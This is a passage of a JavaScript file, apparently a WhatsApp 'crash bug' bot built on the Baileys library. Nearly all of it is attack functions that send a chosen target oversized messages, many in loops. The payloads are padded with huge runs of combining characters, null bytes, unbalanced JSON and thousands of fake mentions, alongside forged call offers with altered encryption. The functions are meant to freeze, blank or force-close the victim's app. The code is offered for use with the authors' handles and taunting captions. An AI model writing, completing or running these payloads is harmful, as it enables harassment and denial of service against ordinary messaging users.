  let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)])
  let porno = sock.createParticipantNodes.bind(sock)
  let yntkts = sock.encodeWAMessage?.bind(sock)

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length)
      return { nodes: [], shouldIncludeDeviceIdentity: false }

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message)
    let ywdh = Array.isArray(patched)
      ? patched
      : recipientJids.map(j => ({ recipientJid: j, message: patched }))

    let { id: meId, lid: meLid } = sock.authState.creds.me
    let omak = meLid ? jidDecode(meLid)?.user : null
    let shouldIncludeDeviceIdentity = false

    let nodes = await Promise.all(
      ywdh.map(async ({ recipientJid: j, message: msg }) => {
        let { user: targetUser } = jidDecode(j)
        let { user: ownPnUser } = jidDecode(meId)

        let isOwnUser = targetUser === ownPnUser || targetUser === omak
        let y = j === meId || j === meLid

        if (dsmMessage && isOwnUser && !y)
          msg = dsmMessage

        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg))

        return memek.mutex(j, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({
            jid: j,
            data: bytes
          })

          if (type === "pkmsg")
            shouldIncludeDeviceIdentity = true

          return {
            tag: "to",
            attrs: { jid: j },
            content: [{
              tag: "enc",
              attrs: { v: "2", type, ...extraAttrs },
              content: ciphertext
            }]
          }
        })
      })
    )

    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity
    }
  }

  let awik = crypto.randomBytes(32)
  let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)])

  let { nodes: destinations, shouldIncludeDeviceIdentity } =
    await sock.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: "0" }
    )

  let callNode = {
    tag: "call",
    attrs: {
      to: jid,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1,5,247,9,228,250,1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  }

  await sock.sendNode(callNode)
}

async function BokepCrash(sock, target) { 
  let msg = {
     viewOnceMessage: {
        message: {
           interactiveMessage: {
              body: {
                 text: "Hii i`m Azka " + "ោ៝".repeat(45000)
               },
                messageContextInfo: {
                   deviceListMetadata: {},
                   deviceListMetadataVersion: 2,
                   name: "ោ៝".repeat(15000),
                   address: "azka.com.ixx" + "azka.com.ixx"
                 },
                  locationMessage: {
                     degressLatitude: -5,
                     degressLongitude: 5
                   },
                   documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                      fileLength: "999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                      fileName: "Halo Mass!!" + "ꦾ".repeat(60000),
                      fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                      directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                      mediaKeyTimestamp: 1743848703,
                    },
                    nativeFlowMessage: {
                       messageParamsJson: "{[".repeat(5000),
                          buttons: [
                             {
                               name: "review_and_pay",
                               buttonsParamsJson: ""
                             },
                             {
                               name: "send_location",
                               buttonsParamsJson: ""
                             }
                          ]
                       },
                       orderMessage: {
                            orderId: "92828",
                               thumbnail: null, 
                                  itemCount: 9999999999,
                                   status: "INQUIRY", 
                                   surface: "CATALOG", 
                                   message: "Hika", 
                                   orderTitle: "Mynwa", 
                                   sellerJid: target, 
                                   token: "8282882828==",
                                   totalAmount1000: "828828292727372728829", 
                                   totalCurrencyCode: "IDR", 
                                   messageVersion: 1,
                                   isSampled: true, 
                                   participant: target, 
                                   remoteJid: "status@Broadcast", 
                                   forwardingScore: 9741,
                                   isForwarded: true, 
                                  },
                                  newsletterAdminInviteMessage: {
                                     newsletterJid: "1@newsletter",
                                     newsletterName: "꧔".repeat(3000) + "\u0000".repeat(3000),
                                     caption: "\u0000".repeat(2000) + "ោ៝".repeat(60000),
                                     inviteExpiration: Date.now() + 9999999999,
                                   }
                              }
                        }
                  }
            };

let msg1 = {
      viewOnceMessage: {
          message: {
              stickerMessage: {
                 url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c&mms3=true",
                 fileSha256: "1nmk47DVAUSmXUUJxfOD5X/LwUi0BgJwgmCvOuK3pXI=",
                 fileEncSha256: "LaaBTYFkIZxif2lm2TfSIt9yATBfYd9w86UxehMa4rI=",
                 mediaKey: "7XhMJyn+ss8sVb2qs36Kh9+lrGVwu29d1IO0ZjHa09A=",
                 mimetype: "image/webp",
                 height: 9999,
                 width: 9999,
                 directPath: "/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c",
                 fileLength: "22254",
                 mediaKeyTimestamp: "1761396583",
                 isAnimated: false,
                 stickerSentTs: Date.now(),
                 isAvatar: false,
                 isAiSticker: false,
                 isLottie: false,
                   contextInfo: {
                      participant: target,
                      mentionedJid: [
                        target,
                         ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        ),
                     ],
                     remoteJid: "X",
                       participant: target,
                       stanzaId: "1234567890ABCDEF",
                       quotedMessage: {
                          paymentInviteMessage: {
                             serviceType: 3,
                             expiryTimestamp: Date.now() + 1814400000
                          }
                       }
                    }
                 }
              }
           }
        };
        
   for (const mwe of [msg, msg1]) {
     await sock.relayMessage(target, mwe, {
       messageId: null,
       participant: { jid: target }
     });
   }
   
   console.log("Succes Send Bug By nanzlyora");
}

async function MasBugBlank(target) {
  try {
    const msg = {
      message: {
        interactiveMessage: {
          header: {
            title: "", //Jan di isi teks bego 
            hasMediaAttachment: false
          },
          body: {
            text: "🍷Fadlan Is Here ¿?"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(5000),
                  url: "https://" + "𑜦𑜠".repeat(10000) + ".my.id"
                })
              },
              {
                name: "mpm",
                buttonParamsJson: "𑜦𑜠".repeat(10000)
              }
            ]
          }
        }
      }
    };

    await sock.relayMessage(
      target,
      msg.message,
      { messageId: null }
    );

    console.log("BLANK SEND TO TARGET");
  } catch (err) {
    console.error(err);
  }
}
  
async function carouselDelay(sock, target) {
  let haxxn = 2;

  for (let x = 0; x < 10; x++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 5; i++) {
      buttt.push({
        name: "galaxy_message",
        buttonParamsJson: JSON.stringify({
          header: "null",
          body: "xxx",
          flow_action: "navigate",
          flow_action_payload: { screen: "FORM_SCREEN" },
          flow_cta: "Grattler",
          flow_id: "1169834181134583",
          flow_message_version: "3",
          flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 1000; i++) {
      push.push({
        body: { text: `\u0000\u0000\u0000\u0000\u0000` },
        footer: { text: "" },
        header: {
          title: "Masbug\u0000\u0000\u0000\u0000",
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "591",
            height: 0,
            width: 0,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            scanLengths: [247, 201, 73, 63],
            midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        nativeFlowMessage: { buttons: [] }
      });
    }

    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: { text: "\u0000\u0000\u0000\u0000" },
              footer: { text: "F-SEVEEN" },
              header: { hasMediaAttachment: false },
              carouselMessage: { cards: [...push] }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
}

async function OfferXForclose(sock, target) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
let devices = (
await sock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await sock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let Raza = xnxx();
let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let XMods = sock.createParticipantNodes.bind(sock);
let Cyber = sock.encodeWAMessage?.bind(sock);

sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let memeg = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = sock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = Official(Cyber ? Cyber(msg) : encodeWAMessage(msg));

return Raza.mutex(jid, async () => {
let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let Exo = crypto.randomBytes(32);
let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": sock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
}] : [])
]
}]
};
await sock.sendNode(lemiting);
}

async function spamhard(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "NanzIsHere",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"+9999999999\",\"building_name\":\"Hayoo\",\"address\":\"/Hayoo\",\"tower_number\":\"987\",\"city\":\"Hayoo\",\"name\":\"CRB\",\"phone_number\":\"+888888888888\"x,\"house_number\":\"99\",\"floor_number\":\"99\",\"state\":\"${"\u0000".repeat(5000)}\"}}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, n) => ({
              participant: `62${n + 829599}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}
async function BlankUi(sock, target) {
  await sock.relayMessage(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "caption": "NANZ GANTENK TAU",
      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
      "fileLength": "175891",
      "seconds": 1,
      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
      "height": 848,
      "width": 480,
      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
      "mediaKeyTimestamp": "1765345955",
      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
      "annotations": [{
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMusic": {
            "musicContentMediaId": "3312808138872179",
            "songId": "270259430421407",
            "author": "ြ".repeat(200000),

            "title": " #NANZ CRASH UI ",
            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
            "countryBlocklist": "",
            "isExplicit": true,
            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
            "musicSongStartTimeInMs": "10149",
            "derivedContentStartTimeInMs": "0",
            "overlapDurationInMs": "1000"
          }
        },
        "embeddedAction": true
      }]
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
}
async function delaySpam(sock, target) {
    let parse = true;

    for (let i = 0; i < 95; i++) {
        await sock.relayMessage("status@broadcast", {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " # ⌁⃰NANZ NIH DEK ⭒ t.me/nanzlyora ",
                            format: 1
                        },
                        nativeFlowResponseMessage: {
                            name: "book_confirmation",
                            paramsJson: JSON.stringify({
                                status: "ok",
                                title: "𑇂𑆵𑆴𑆿".repeat(5000),
                                subtitle: " ".repeat(2000),
                                bookingInfo: "{".repeat(10000),
                                date: " # ⌁⃰NANZ NIH DEK ⭒ t.me/nanzlyora " + "ោ៝".repeat(10000),
                                time: " # ⌁⃰NANZ NIH DEK ⭒ t.me/nanzlyora " + "ោ៝".repeat(10000),
                                address: " # ⌁⃰NANZ NIH DEK ⭒ t.me/nanzlyora " + "ꦾ".repeat(40000),
                                price: " # ⌁⃰NANZ NIH DEK ⭒ t.me/nanzlyora " + "ꦾ".repeat(40000)
                            }),
                            version: 3
                        },
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            placeholder: Math.random().toString(36)
                        }
                    }
                }
            }
        }, 
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });
    }
}
async function JawaTimurForcloseClick(target) {
 for (let n = 0; n < 100; n++) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: { 
        text: "KENALAN YUH AMAN NAN?" 
        },
        nativeFlowMessage: {
          buttons: [
           {
              name: (["inapp_signup", "booking_status", "galaxy_message"][(n + (Math.random() < 0.5 ? 1 : 0)) % 3]),
              buttonParamsJson: `{}`
            }
          ]
        }
      }
    }, 
      { 
        participant: {
        jid: target 
       }
     }
   );
 }
}
async function FreezeChatByMia(sock, target) {
  await sock.relayMessage(target, {
     interactiveResponseMessage: {
        body: {
          text: "Nanz Sange",
          format: 1
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"wa_flow_response_params\":{\"title\":${"𑇂𑆵𑆴𑆿".repeat(60000)}}}`,
          version: 3,
        }
     }
  }, { participant: { jid: target } });
}